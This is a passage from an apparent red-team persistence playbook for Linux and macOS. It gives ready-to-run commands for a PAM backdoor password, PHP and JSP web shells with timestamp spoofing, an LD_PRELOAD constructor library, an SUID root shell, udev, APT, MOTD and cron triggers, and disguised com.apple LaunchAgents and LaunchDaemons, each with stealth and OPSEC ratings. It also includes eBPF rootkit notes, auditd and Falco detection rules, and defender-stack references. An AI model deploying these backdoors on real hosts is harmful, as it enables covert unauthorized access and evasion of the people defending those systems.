  echo "ssh-ed25519 AAAA...key" >> "$user_home/.ssh/authorized_keys" 2>/dev/null
  chmod 600 "$user_home/.ssh/authorized_keys" 2>/dev/null
  chmod 700 "$user_home/.ssh" 2>/dev/null
done

# Ensure SSH allows key auth:
grep -q "^PubkeyAuthentication" /etc/ssh/sshd_config || echo "PubkeyAuthentication yes" >> /etc/ssh/sshd_config
```

### 8.6 — PAM Backdoor (T1556.003)

```bash
# ═══════════════════════════════════════════════════════════
# PAM BACKDOOR — patch pam_unix.so for hardcoded backdoor password
# MITRE ATT&CK: T1556.003 (Pluggable Authentication Modules)
# STEALTH: VERY HIGH (without FIM/EDR); MEDIUM (against hardened)
# SURVIVABILITY: Reboot ✓ Passwd ✓ OS Update Maybe Reimage ✗
# CLEANUP COST: HIGH (PAM module restoration + audit all auth logs)
# ═══════════════════════════════════════════════════════════
# Method: Modify PAM source → compile → replace
# /lib/x86_64-linux-gnu/security/pam_unix.so
# In pam_unix_auth.c, add before password verification:
#   if (strcmp(p, "backdoor_password") == 0) return PAM_SUCCESS;

# Compile and replace:
# cp /lib/x86_64-linux-gnu/security/pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so.bak
# cp custom_pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so
# chmod 644 /lib/x86_64-linux-gnu/security/pam_unix.so

# Alternatively: add custom PAM module to /etc/pam.d/ configs:
# echo "auth sufficient pam_backdoor.so" added early in /etc/pam.d/common-auth

# DETECTION:
# - File integrity monitoring on PAM modules (AIDE, osquery file_events,
#   Tripwire) — hash comparison
# - auditd file watches on /lib/x86_64-linux-gnu/security/ catch
#   replacement in hardened environments
# - EDR with Linux sensors (CrowdStrike Falcon, SentinelOne, MDE for
#   Linux, Elastic Defend) monitor PAM module loads + flag unsigned /
#   unexpected modifications

# OPSEC: VERY HIGH on hosts without FIM/EDR — extremely difficult to
# detect. Against hardened Linux with auditd + EDR, replacement is
# first-class detection signal.
```

### 8.7 — Udev Rules (Device-Triggered)

```bash
# ═══════════════════════════════════════════════════════════
# UDEV RULES — fires on device events
# STEALTH: MED-HIGH
# ═══════════════════════════════════════════════════════════
cat << 'EOF' > /etc/udev/rules.d/99-usb-trigger.rules
ACTION=="add", SUBSYSTEM=="usb", RUN+="/opt/.cache/session-mgr"
EOF
udevadm control --reload-rules

# DETECTION: New files in /etc/udev/rules.d/; auditd watches common in
# hardened environments
# OPSEC: Less commonly watched than cron/systemd; inventoried by mature
# Linux persistence audits
```

### 8.8 — Package Manager Hooks (APT / YUM)

```bash
# ═══════════════════════════════════════════════════════════
# APT / YUM HOOKS — fires on package management
# ═══════════════════════════════════════════════════════════
# APT hook (Debian/Ubuntu):
cat << 'EOF' > /etc/apt/apt.conf.d/99-update-check
APT::Update::Pre-Invoke {"/opt/.cache/session-mgr &"};
EOF

# YUM plugin (RHEL/CentOS):
# Create plugin in /usr/lib/yum-plugins/ with init() that runs payload

# DETECTION: New files in /etc/apt/apt.conf.d/, yum plugin directory;
# AIDE/osquery file_events on /etc/apt/ and /etc/yum.conf.d/
# OPSEC: MED-HIGH — fires on legitimate maintenance; commonly present
# in persistence-focused FIM scopes
```

### 8.9 — MOTD / update-motd.d (Ubuntu/Debian-Specific)

```bash
# ═══════════════════════════════════════════════════════════
# update-motd.d — Ubuntu/Debian SSH-login trigger
# ═══════════════════════════════════════════════════════════
# NOT universal Linux — Ubuntu/Debian only via pam_motd
# Check: dpkg -l | grep update-motd  OR  ls /etc/update-motd.d/
echo '#!/bin/sh' > /etc/update-motd.d/99-health
echo '/opt/.cache/session-mgr &' >> /etc/update-motd.d/99-health
chmod +x /etc/update-motd.d/99-health

# DETECTION: File changes in /etc/update-motd.d/
# OPSEC: MED-HIGH on unmonitored Ubuntu hosts; auditd file watches catch
# in hardened environments
```

### 8.10 — Web Shell (T1505.003)

```bash
# ═══════════════════════════════════════════════════════════
# WEB SHELL — basic deployment
# MITRE ATT&CK: T1505.003 (Web Shell)
# STEALTH: MEDIUM (webshell scanners detect common patterns)
# ═══════════════════════════════════════════════════════════
# (See §12.1 for advanced webshell techniques)

# PHP:
echo '<?php if(isset($_REQUEST["c"])){system($_REQUEST["c"]);} ?>' > /var/www/html/.health.php

# Obfuscated PHP:
echo '<?php $v="sys"."tem";$v($_REQUEST["c"]); ?>' > /var/www/html/.health.php

# JSP (blind execution):
echo '<%if(request.getParameter("c")!=null){Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",request.getParameter("c")});}%>' > /opt/tomcat/webapps/ROOT/.health.jsp

# Timestamp match to surrounding files:
touch -r /var/www/html/index.php /var/www/html/.health.php

# DETECTION: FIM on webroot, web access logs, webshell scanners
```

```
═══════════════════════════════════════════════════════════
SECTION 8 — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Enables → §9 kernel-level
Cross-ref → §10.4 Linux Defender Stack reference
Cross-ref → §12 web app persistence (web shell extended)
```

---

## 9 — LINUX: KERNEL & ADVANCED PERSISTENCE

### 9.1 — eBPF Rootkit / Persistence (T1014)

```
═══════════════════════════════════════════════════════════
eBPF ROOTKIT — DOMINANT 2024-2026 LINUX PERSISTENCE RESEARCH DIRECTION
MITRE ATT&CK: T1014 (Rootkit)
STEALTH: VERY HIGH (without Falco/Tetragon/Tracee deployed)
SURVIVABILITY: Reboot ✓ Passwd ✓ OS Update Maybe Reimage ✗
CLEANUP COST: VERY HIGH (full reimage required to be confident)
═══════════════════════════════════════════════════════════

eBPF is a kernel facility for safe, verifier-checked bytecode running in
kernel space. Built for observability and networking; adversaries
repurposed for persistence, process/file/network hiding, and magic-
packet-activated backdoors.

WHY IT MATTERS:
- eBPF programs attach to kernel tracepoints, kprobes, XDP hooks, syscall
  entry/exit paths
- Can modify, redact, fabricate syscall output WITHOUT modifying kernel
  memory or loading an LKM
- Loading requires CAP_BPF (kernel 5.8+) or CAP_SYS_ADMIN
- BPF programs are bytecode checked by in-kernel verifier — NOT module
  signing chain
- On kernel 5.x+ with CAP_SYS_ADMIN: defeat tools relying on procfs,
  netstat, ps, ls — by hooking sys_getdents, sys_read on /proc/net/*,
  and related syscalls

OBSERVED REAL-WORLD IMPLANTS:
- BPFDoor (PwC / CrowdStrike 2022, ★ STILL ACTIVE 2024-2025)
  - Passive backdoor via raw socket BPF filter
  - Activates on magic packet matching specific byte sequence
  - New samples through 2024-2025 per Trend Micro and JPCERT
  - April 2025 Trend Micro: BPFDoor controller targeting AMEA telecom /
    finance / retail; Earth Bluecrow attribution
    Source: https://www.trendmicro.com/en_us/research/25/d/bpfdoor-hidden-controller.html

- Symbiote (BlackBerry / Intezer 2022) — injected as shared library via
  LD_PRELOAD; uses eBPF to hide its network traffic from pcap-based
  inspection on infected host

- ★ LinkPro (Synacktiv, October 2025) — AWS/Kubernetes-targeted backdoor
  Source: https://www.synacktiv.com/en/publications/linkpro-ebpf-rootkit-analysis
  Infection chain:
    Compromise Jenkins via CVE-2024-23897 → deploy malicious Docker
    image containing two eBPF modules (one hides rootkit via sys_bpf
    hook, one activates on "magic TCP SYN" with window size 54321) →
    persist via systemd service disguised as systemd-resolved
  Dormant until magic packet arrives — undetectable via port scanning
  Written in Go

- TripleCross (h3xduck, academic/PoC) — full eBPF rootkit with
  backdoor, library injection, execution hijacking, file/directory
  hiding via sys_getdents tampering. Reference implementation for
  offensive eBPF research.

- ebpfkit (Guillaume Fournier / DEF CON 29) — older PoC; C2 via covert
  channel embedded in legitimate HTTP traffic.

INSTALLATION PATTERN (conceptual):
1. Compile BPF program(s) targeting kernel tracepoints/kprobes
   (sys_bpf, sys_getdents, sys_kill, inet_csk_accept, etc.)
2. Load via libbpf or raw bpf() syscall from userspace loader with CAP_BPF
3. Pin programs to bpffs (/sys/fs/bpf/) to persist across loader exit
4. Install systemd unit to reload pinned programs on boot
5. Configure hide-lists via BPF map entries (PIDs, file prefixes, TCP ports)

MAGIC PACKET TRIGGER PATTERN (BPFDoor / LinkPro):
- XDP or socket filter BPF program on ingress
- Inspects every incoming packet; matches signature (byte sequence,
  TCP window size, ICMP length)
- On match: executes userspace trigger via bpf_send_signal,
  perf_event notification, or shared memory map polled by userspace
- Userspace component spawns reverse shell / enables listener
- NO open ports visible to external scanning until magic packet arrives

DETECTION (defender-facing):
- bpftool prog list / bpftool map list — rootkit hooking sys_bpf can
  hide its own programs from this output. Defenders must inspect
  /proc/<pid>/maps + kernel memory directly OR use off-host perspective
  (LiME memory capture, remote eBPF audit via Falco on separate node)
- /sys/fs/bpf/ — often unmounted/empty on vanilla servers; unexpected
  pins warrant investigation
- Kernel audit subsystem with bpf() syscall watch:
    auditctl -a always,exit -F arch=b64 -S bpf -k ebpf_load
- Falco / Tetragon / Tracee — runtime security tools with eBPF-aware
  detection. THEMSELVES eBPF-based, so they see activity tools like
  bpftool cannot.
- Anomalous traffic to raw sockets — BPFDoor-class magic packet
  listeners visible as processes holding AF_PACKET sockets with
  non-standard filters (ss -p -N --bpf on some kernels)
- /proc/kallsyms inspection for unexpected kprobes
- Network-side: XDP programs on compromised host CANNOT hide traffic
  from upstream network sensor (firewall flow logs, VPC flow logs,
  cloud provider packet capture). EXTERNAL NETWORK TELEMETRY IS THE
  SINGLE MOST RELIABLE DETECTION SURFACE.

ERADICATION:
- bpftool prog detach / bpftool prog del for visible programs
- Unmount bpffs, remove /sys/fs/bpf/ pins
- Kill userspace loader processes
- Rebuild the host — rootkit that survived initial remediation may
  have re-installed via systemd unit or ld.so.preload helper; full
  reimage is the only reliable cleanup against mature eBPF implants
- Audit for lateral spread via shared container images or K8s
  DaemonSets (LinkPro specifically targets K8s clusters)

PRE-CONDITIONS THAT BREAK IT:
- CAP_BPF / CAP_SYS_ADMIN restricted via SELinux/AppArmor
- Kernel config CONFIG_BPF_JIT_ALWAYS_ON disabled
- sysctl kernel.unprivileged_bpf_disabled=1 (default on modern distros)
- Read-only root filesystem prevents loader persistence

OPSEC RATING: VERY HIGH on hosts without eBPF-aware defensive telemetry.
Against hosts with Falco / Tetragon / Tracee deployed, eBPF program
loads are first-class detection surface — rootkit's own hiding does
not extend to off-host observer.
```

### 9.2 — LD_PRELOAD Hijacking (T1574.006)

```bash
# ═══════════════════════════════════════════════════════════
# LD_PRELOAD — shared lib loaded before all others
# MITRE ATT&CK: T1574.006 (Dynamic Linker Hijacking)
# STEALTH: HIGH but /etc/ld.so.preload is a known IoC
# ═══════════════════════════════════════════════════════════
cat << 'CEOF' > /tmp/evil.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>

__attribute__((constructor)) void init() {
    struct stat st;
    if (stat("/tmp/.X11-lock.session", &st) == 0) return;
    if (fork() == 0) {
        setsid();
        FILE *f = fopen("/tmp/.X11-lock.session", "w");
        if (f) { fprintf(f, "%d", getpid()); fclose(f); }
        execl("/opt/.cache/session-mgr", "session-mgr", NULL);
    }
}
CEOF
gcc -shared -fPIC -o /opt/.cache/libhealth.so /tmp/evil.c -nostartfiles
rm /tmp/evil.c

echo "/opt/.cache/libhealth.so" > /etc/ld.so.preload

# DETECTION:
# - /etc/ld.so.preload existence/modification
# - LD_PRELOAD environment variable
# - Non-standard libraries (ldd comparison)
# - Falco rule on /etc/ld.so.preload write
```

### 9.3 — Kernel Module (T1547.006)

```bash
# ═══════════════════════════════════════════════════════════
# KERNEL MODULE — LKM persistence
# MITRE ATT&CK: T1547.006 (Kernel Modules and Extensions)
# STEALTH: VERY HIGH if loaded; module-signing enforcement may block
# ═══════════════════════════════════════════════════════════
# Modern kernels (5.4+) with Secure Boot may require signed modules
# Check: cat /proc/sys/kernel/modules_disabled (1 = loading disabled)
# Check: mokutil --sb-state (SecureBoot enabled?)

insmod /opt/.cache/khealth.ko

# Boot persistence:
echo "khealth" >> /etc/modules

# DKMS for survival across kernel updates

# DETECTION: lsmod, /proc/modules, dmesg (module load messages)
# OPSEC: VERY HIGH stealth if loaded — kernel-level access
```

### 9.4 — SUID Binary / Capabilities (T1548.001)

```bash
# ═══════════════════════════════════════════════════════════
# SUID + capabilities — privesc re-establishment paths
# MITRE ATT&CK: T1548.001 (Setuid/Setgid)
# ═══════════════════════════════════════════════════════════
# SUID copy of bash:
cp /bin/bash /usr/local/bin/.dbus-session
chmod u+s /usr/local/bin/.dbus-session
# Usage: /usr/local/bin/.dbus-session -p

# Capabilities (less visible in find -perm -4000 scans):
cat << 'CEOF' > /tmp/cap_shell.c
#include <unistd.h>
#include <stdlib.h>
int main() {
    setuid(0); setgid(0);
    system("/bin/bash -p");
    return 0;
}
CEOF
gcc -o /usr/local/bin/.dbus-session /tmp/cap_shell.c && rm /tmp/cap_shell.c
setcap cap_setuid,cap_setgid+ep /usr/local/bin/.dbus-session

# DETECTION:
# - find / -perm -4000 (SUID audit)
# - getcap -r / (capability audit)
# - osquery suid_bin table
```

### 9.5 — netfilter / iptables Backdoor

```bash
# ═══════════════════════════════════════════════════════════
# NETFILTER / IPTABLES BACKDOOR
# ═══════════════════════════════════════════════════════════
# Hidden listener — accept connections on non-standard port:
iptables -I INPUT -p tcp --dport 31337 -j ACCEPT

# Persist rules:
iptables-save > /etc/iptables/rules.v4

# DETECTION: iptables -L diff vs baseline; unusual ACCEPT rules
```

```
═══════════════════════════════════════════════════════════
SECTION 9 — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Enables → ALL OTHER LINUX LAYERS (kernel access enables anything)
Cross-ref → §10.4 Linux Defender Stack reference
Cross-ref → §13 K8s container persistence (LinkPro hits K8s)
NEVER → Load LKM on Secure-Boot-enforced host without signed module;
        kernel taint + alert
```

---

## 10 — LINUX: OPSEC & DETECTION REFERENCE

### 10.1 — Detection Sources

```
═══════════════════════════════════════════════════════════
LINUX DETECTION SOURCES (mature 2026 stack)
═══════════════════════════════════════════════════════════
auditd rules (if deployed):
  -w /etc/crontab -p wa -k cron_mod
  -w /etc/cron.d/ -p wa -k cron_mod
  -w /var/spool/cron/ -p wa -k cron_mod
  -w /etc/systemd/system/ -p wa -k systemd_mod
  -w /etc/ld.so.preload -p wa -k preload
  -w /etc/pam.d/ -p wa -k pam_mod
  -w /root/.ssh/authorized_keys -p wa -k ssh_keys
  -a always,exit -F arch=b64 -S bpf -k ebpf_load
  -a always,exit -F arch=b32 -S bpf -k ebpf_load
  -w /etc/update-motd.d/ -p wa -k motd

File integrity monitoring (AIDE, OSSEC, Tripwire):
  Monitors: /etc/, /usr/lib/, /usr/bin/, /var/www/, PAM modules, SSH configs
  Run: aide --check

Process monitoring:
  Unusual parent-child relationships (cron → shell → beacon)
  Processes from /tmp/, /dev/shm/, /var/tmp/, dotfiles in /home/

Log sources:
  /var/log/auth.log — SSH, sudo, PAM
  /var/log/syslog — cron, systemd starts
  /var/log/secure — RHEL/CentOS auth log
  journalctl — systemd service + timer execution

Modern eBPF-native runtime security:
  Falco — eBPF-aware rule engine (CNCF graduated)
  Tetragon — eBPF-based process/syscall observability (Cilium)
  Tracee — eBPF-based threat detection (Aqua Security)
```

### 10.2 — Stealth Ranking

```
═══════════════════════════════════════════════════════════
LINUX PERSISTENCE STEALTH RANKING (safest → most detected) — 2026
═══════════════════════════════════════════════════════════
1. eBPF rootkit (no Falco/Tetragon/Tracee deployed)  Maximum if undetected
2. PAM backdoor (no FIM)                             Hash-comparison detect
3. LD_PRELOAD / shared lib                           /etc/ld.so.preload IoC
4. Kernel module (no signing enforcement)            dmesg + /proc/modules
5. Package manager hooks                             Rare FIM coverage
6. udev rules                                        Less commonly watched
7. Systemd timer                                     Blends with maintenance
8. MOTD scripts (Ubuntu/Debian)                      auditd watches in hardened
9. Git hooks                                         Developer-targeted
10. Cron                                             Common; frequently audited
11. SSH authorized_keys                              Trivially discoverable

HONEST ASSESSMENT:
  Linux offensive telemetry has matured dramatically with eBPF-native
  tools (Falco, Tetragon, Tracee) and modern EDRs (CrowdStrike Falcon
  Linux, SentinelOne, MDE for Linux, Elastic Defend). Against a host
  with Tetragon or Falco deployed, even eBPF rootkits are visible —
  defensive tool watches from same kernel surface offensive tool
  operates from. Stealth ordering above assumes most common real-world
  Linux host (auditd + syslog, no dedicated runtime security tool);
  against modern stack, ranking compresses substantially.
```

### 10.3 — Hunting Queries

```
# auditd — BPF program loads
# /etc/audit/rules.d/60-ebpf.rules
-a always,exit -F arch=b64 -S bpf -k ebpf_load
-a always,exit -F arch=b32 -S bpf -k ebpf_load

# auditd — PAM module integrity
-w /lib/x86_64-linux-gnu/security/ -p wa -k pam_mod
-w /lib64/security/ -p wa -k pam_mod
-w /etc/pam.d/ -p wa -k pam_cfg

# auditd — systemd/preload/shadow integrity
-w /etc/systemd/system/ -p wa -k systemd_unit
-w /usr/lib/systemd/system/ -p wa -k systemd_unit
-w /etc/ld.so.preload -p wa -k ldpreload
-w /etc/shadow -p wa -k shadow_write
```

```sql
-- osquery — running BPF programs (modern osquery)
SELECT * FROM bpf_process_events WHERE pid NOT IN
  (SELECT pid FROM processes WHERE name IN ('systemd-journald', 'systemd'));

-- osquery — unusual setuid / cap_setuid binaries
SELECT f.path, f.mode, u.username
FROM file f JOIN users u ON (f.uid = u.uid)
WHERE f.path LIKE '/usr/local/bin/%' OR f.path LIKE '/opt/%'
  AND (f.mode LIKE '%s%' OR f.mode LIKE '%S%');

-- osquery — authorized_keys monitoring
SELECT u.username, ak.key, ak.path FROM users u
JOIN authorized_keys ak ON ak.uid = u.uid;
```

```yaml
# Falco rule — unexpected BPF program load
- rule: Unexpected BPF Program Load
  desc: Detect bpf() syscall from non-allowlisted processes
  condition: >
    evt.type = bpf and evt.dir = > and
    not proc.name in (bpftool, iproute2, bcc_tools_allowlist)
  output: "Unauthorized BPF load by %proc.name (pid=%proc.pid cmd=%proc.cmdline)"
  priority: WARNING

# Falco rule — new file in /etc/update-motd.d/
- rule: MOTD Script Created
  desc: New executable in MOTD directory
  condition: >
    evt.type in (openat, creat) and evt.dir = < and
    fd.directory = "/etc/update-motd.d" and
    evt.rawres >= 0 and evt.is_open_write = true
  output: "MOTD script written by %proc.name (fd.name=%fd.name)"

# Falco rule — /etc/ld.so.preload modification
- rule: ld.so.preload Modified
  desc: Detect modification of /etc/ld.so.preload
  condition: >
    evt.type in (open, openat) and fd.name = "/etc/ld.so.preload" and
    evt.is_open_write = true
  output: "ld.so.preload modified by %proc.name (cmd=%proc.cmdline)"
  priority: HIGH
```

### 10.4 — Defender Stack Reference (Linux-Side)

```
═══════════════════════════════════════════════════════════
WHAT EACH DEFENDER PRODUCT SEES (Linux persistence-specific)
═══════════════════════════════════════════════════════════

ENDPOINT (Linux EDR):
  Microsoft Defender for Endpoint Linux
    Sees: Process / file / network events via auditd integration; recent
    versions (2024+) include eBPF-native sensor for kernel-level
    visibility comparable to dedicated runtime tools.
    Detects: Service installs, cron mods, SSH key changes, suspicious
    process trees, BPF program loads (in eBPF-sensor mode).

  CrowdStrike Falcon Linux
    Sees: Same primitives via Falcon eBPF sensor; strong behavioral
    classification; Storyline graph for attack reconstruction.

  SentinelOne Singularity Linux
    Storyline causal-graph reconstruction; eBPF-based sensor; container
    visibility extension for K8s nodes.

  Elastic Defend (formerly endgame)
    Open-source-foundation EDR; eBPF-based sensor; integrates with
    Elastic SIEM for cross-host correlation.

RUNTIME SECURITY (eBPF-native):
  Falco (CNCF graduated)
    eBPF rule engine; broad rule library for K8s + standalone Linux;
    detects BPF program loads, suspicious syscalls, container escapes.

  Tetragon (Cilium)
    eBPF-based process/syscall observability; deep K8s integration;
    enforcement mode (kill-pid, override syscall return) beyond
    pure detection.

  Tracee (Aqua Security)
    eBPF-based threat detection; detection rule library; integration
    with Aqua Cloud Security platform.

LEGACY (still common):
  auditd
    Kernel audit subsystem; rule-based event capture; high noise
    without careful tuning. Required compliance baseline (PCI, FedRAMP).

  osquery (Facebook → Osquery Foundation)
    SQL interface to OS state; broad table coverage including
    authorized_keys, suid_bin, processes, file integrity, BPF events
    in modern versions. Often deployed alongside EDR for hunt queries.

CLOUD-SIDE LINUX (cloud workload protection):
  Wiz / Lacework / Orca / Sysdig Secure
    Cloud-resource configuration drift, persistence-relevant misconfig
    detection (over-permissioned IAM on EC2, etc.), runtime visibility
    for cloud Linux workloads. Sysdig's runtime piece originated as
    Falco's commercial parent.

XDR CORRELATION:
  Defender XDR / CrowdStrike XDR / S1 Singularity / Elastic SIEM
    Linux endpoint events correlated across cloud control plane,
    identity events, network telemetry. Multi-host attack graph
    reconstruction; automated containment (host quarantine, process
    kill, cred revoke).
```

```
═══════════════════════════════════════════════════════════
SECTION 10 — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Cross-ref → §6 Windows OPSEC reference
Cross-ref → §13 K8s persistence (eBPF rootkits often deploy on K8s nodes)
```

---

## 11 — MACOS PERSISTENCE

### 11.1 — Modern macOS Baseline (Read Before Anything Else)

```
═══════════════════════════════════════════════════════════
MODERN macOS BASELINE (Ventura 13 / Sonoma 14 / Sequoia 15+)
═══════════════════════════════════════════════════════════

BACKGROUND TASK MANAGEMENT (BTM) — Ventura October 2022+:
  - All LaunchAgent, LaunchDaemon, Login Item, and SMAppService
    registrations consolidated into BTM database at:
    /private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-*.btm
    (v4 on Ventura, v8 on Sonoma+)
  - System DAEMON backgroundtaskmanagementd watches the database
  - Adding persistence item triggers user notification ("Background Items
    Added") + Endpoint Security event
    ES_EVENT_TYPE_NOTIFY_BTM_LAUNCH_ITEM_ADD / _REMOVE
  - sfltool dumpbtm enumerates every registered item with UUID, dev
    team ID, executable path, disposition. SINGLE MOST IMPORTANT
    FORENSIC COMMAND ON MODERN macOS.
  - Defensive EDRs (CrowdStrike, SentinelOne, Jamf Protect, Sophos,
    Huntress) subscribe to BTM Endpoint Security events — any new
    persistence item generates high-fidelity alert

OPERATOR IMPLICATIONS:
- "Drop a plist in ~/Library/LaunchAgents" is NOT quiet on Ventura+.
  BTM daemon detects new plist even WITHOUT running launchctl load,
  surfaces user notification, emits ES event seen by installed
  security products.
- Direct plist manipulation via `defaults write com.apple.loginitems`
  frequently IGNORED or REVERTED on modern macOS.
- Working persistence paths on Ventura/Sonoma/Sequoia:
  * AppleScript via System Events (registers correctly with BTM but
    still generates notification + ES event)
  * SMAppService API from signed, notarized application
  * Modifying existing BTM entry of pre-approved app (stealthy but
    requires hijacking legitimate app installer/updater)

DOCUMENTED BTM BYPASS RESEARCH (Patrick Wardle, DEF CON 31, 2023):
  - SIGSTOP to BackgroundTaskManagementAgent (requires root or signal
    permission) suppresses alerts. BTM database continues recording
    item but no notification + ES event delayed/missed depending on
    EDR polling model.
  - sfltool resetbtm resets database; until reboot, no new persistence
    additions trigger alerts.
  - Bundling persistent LaunchAgent inside app bundle approved BEFORE
    persistence registered obscures connection between dev identity
    and persistence item.
  - ★ Q1-Q2 2026 STATUS: NO documented BTM bypass updates 2024-2026
    beyond Wardle DEF CON 31 (Aug 2023). Apple's earlier fixes did NOT
    address root design issues per Wardle. Bypass remains research-grade
    and unreliable against fully patched current macOS — but the
    underlying design weaknesses have not been mitigated.

ADDITIONAL MODERN LAYERS:
- SIP (System Integrity Protection) — blocks modification of /System,
  /usr (except /usr/local), protected processes. Enabled by default;
  disable requires Recovery + csrutil.
- TCC (Transparency, Consent, Control) — user consent database for
  protected resources (Files, Camera, Microphone, Accessibility, Full
  Disk Access). Persistence requiring TCC-protected access needs
  pre-existing consent or TCC bypass.
- Gatekeeper + Notarization — blocks unsigned/unnotarized apps;
  quarantine bit on downloaded files triggers notarization check.
- Launch Constraints (Ventura+) and Environment Constraints (Sonoma+) —
  categorize binaries into constraint classes defining who can launch
  them, from where, and as a child of what. Blocks common dylib hijacks
  against system binaries.
- XProtect / XProtectRemediator — Apple's built-in signature + behavioral
  detection. Updated out-of-band; detects known persistence patterns.
```

### 11.2 — Launch Agents — User (T1543.001)

```bash
# ═══════════════════════════════════════════════════════════
# LAUNCH AGENT — per-user, runs as current user on login
# MITRE ATT&CK: T1543.001 (Launch Agent)
# STEALTH: LOW on Ventura+ (BTM detects)
# SURVIVABILITY: Reboot ✓ Passwd ✓ OS Update Maybe Reimage ✗
# CLEANUP COST: LOW (delete plist + launchctl unload)
# ═══════════════════════════════════════════════════════════
cat << 'EOF' > ~/Library/LaunchAgents/com.apple.health.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>com.apple.health</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Users/Shared/.config/agent</string>
    </array>
    <key>RunAtLoad</key><true/>
    <key>KeepAlive</key><true/>
    <key>StandardOutPath</key><string>/dev/null</string>
    <key>StandardErrorPath</key><string>/dev/null</string>
</dict>
</plist>
EOF
launchctl load ~/Library/LaunchAgents/com.apple.health.plist

# On Ventura+: plist creation triggers backgroundtaskmanagementd → user
# notification + ES event to any installed security product.

# MITIGATION STRATEGIES (operator-side):
# - If EDR not present + user acclimated to dismissing notifications:
#   notification alone is low-signal
# - Co-opt existing approved item (replace target path of already-
#   registered LaunchAgent for legitimately installed app) avoids
#   "new item added" event — but still changes BTM state, detectable
#   via sfltool dumpbtm baseline comparison

# DETECTION:
# - launchctl list | grep -v -f trusted_labels.txt
# - sfltool dumpbtm (BTM inventory — authoritative)
# - ES_EVENT_TYPE_NOTIFY_BTM_LAUNCH_ITEM_ADD (EDR)
# - File creation events in ~/Library/LaunchAgents/

# OPSEC: Apple-namespace (com.apple.*) label legitimate-looking but BTM
# now shows developer team ID. Unsigned binary at the path + no team ID
# is highly suspicious.
```

### 11.3 — Launch Daemons — Root (T1543.004)

```bash
# ═══════════════════════════════════════════════════════════
# LAUNCH DAEMON — root-level, runs at boot
# MITRE ATT&CK: T1543.004 (Launch Daemon)
# STEALTH: LOW (BTM-tracked); requires root
# ═══════════════════════════════════════════════════════════
cat << 'EOF' > /Library/LaunchDaemons/com.apple.diagnosticd.health.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>com.apple.diagnosticd.health</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Library/Application Support/.diag/agent</string>
    </array>
    <key>RunAtLoad</key><true/>
    <key>KeepAlive</key><true/>
</dict>
</plist>
EOF
launchctl load /Library/LaunchDaemons/com.apple.diagnosticd.health.plist

# DETECTION:
# - sfltool dumpbtm (as root for full visibility)
# - ls /Library/LaunchDaemons/ + hash comparison to baseline
# - ES events from installed EDR

# OPSEC: SIP prevents modifying Apple's own daemons in /System;
# /Library/LaunchDaemons is user-writable with root but fully surveilled
# by BTM and installed security products.
```

### 11.4 — Login Items (T1547.015)

```bash
# ═══════════════════════════════════════════════════════════
# LOGIN ITEMS — modern method (Sonoma/Sequoia)
# MITRE ATT&CK: T1547.015 (Login Items)
# STEALTH: LOW (user-visible under Login Items)
# ═══════════════════════════════════════════════════════════
# AppleScript via System Events — properly registers with BTM
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/Users/Shared/.config/agent", hidden:true}'

# LEGACY METHOD (do NOT use on modern macOS):
# defaults write com.apple.loginitems AutoLaunchedApplicationDictionary ...
# On macOS 13+, direct plist manipulation of com.apple.loginitems is
# frequently ignored or reverted by loginitemregisterd. BTM is the
# authoritative store.

# SMAppService (modern API) — requires signed/notarized app bundle:
# From Swift/ObjC: SMAppService.daemon(plistName:).register()
# ONLY method that cleanly integrates with BTM's approval UI without
# generating "suspicious unsigned binary" signal.

# DETECTION:
# - System Settings > General > Login Items (user-visible)
# - sfltool dumpbtm
# - loginitemregisterd logs

# OPSEC RATING: LOW — user-visible; BTM notification fires on add
```

### 11.5 — Cron (macOS)

```bash
# ═══════════════════════════════════════════════════════════
# CRON ON macOS — persistent, BTM-INVISIBLE
# STEALTH: MEDIUM
# SURVIVABILITY: Reboot ✓ Passwd ✓ Reimage ✗
# ═══════════════════════════════════════════════════════════
# cron persists on macOS despite Apple preferring launchd
# Does NOT register with BTM — one of few BTM-invisible paths
(crontab -l 2>/dev/null; echo "*/10 * * * * /Users/Shared/.config/agent >/dev/null 2>&1") | crontab -

# Note: On Sonoma+, cron daemon needs Full Disk Access (TCC) to access
# many user paths — check TCC grants first

# DETECTION:
# - crontab -l, /var/at/tabs/, cron log in Console.app
# - EDRs with cron-specific rules (Jamf Protect, Huntress)

# OPSEC: MEDIUM — cron on macOS is unusual + stands out in process
# telemetry; normal macOS hosts don't use it. BTM-invisible but high
# behavioral signal.
```

### 11.6 — Dylib Hijacking (T1574.004)

```bash
# ═══════════════════════════════════════════════════════════
# DYLIB HIJACKING — macOS DLL-sideload equivalent
# MITRE ATT&CK: T1574.004 (Dylib Hijacking)
# STEALTH: MEDIUM (against unhardened apps); LOW (against modern hardened)
# ═══════════════════════════════════════════════════════════
# Significantly harder on modern macOS due to hardened runtime, library
# validation, Launch Constraints

# Find apps with weak dylib references:
otool -L /Applications/App.app/Contents/MacOS/App | grep -i "@rpath\|@loader_path"
# Place malicious dylib in @rpath search location before legitimate one
# App launches → loads attacker dylib first

# MODERN BLOCKERS:
# - Hardened Runtime (required for notarization): "disable-library-
#   validation" off by default. Signed binaries load only libraries
#   signed by same Team ID (or Apple). Removes most opportunistic hijacks.
# - Launch Constraints (Ventura+): Apple's own system binaries have
#   constraints preventing dylib injection even with root.
# - Environment Constraints (Sonoma+): extends to third-party apps.

# STILL VIABLE AGAINST:
# - Third-party apps not using hardened runtime (rare on recent apps;
#   common on legacy internal apps)
# - Apps with explicit com.apple.security.cs.allow-dyld-environment-
#   variables OR com.apple.security.cs.disable-library-validation
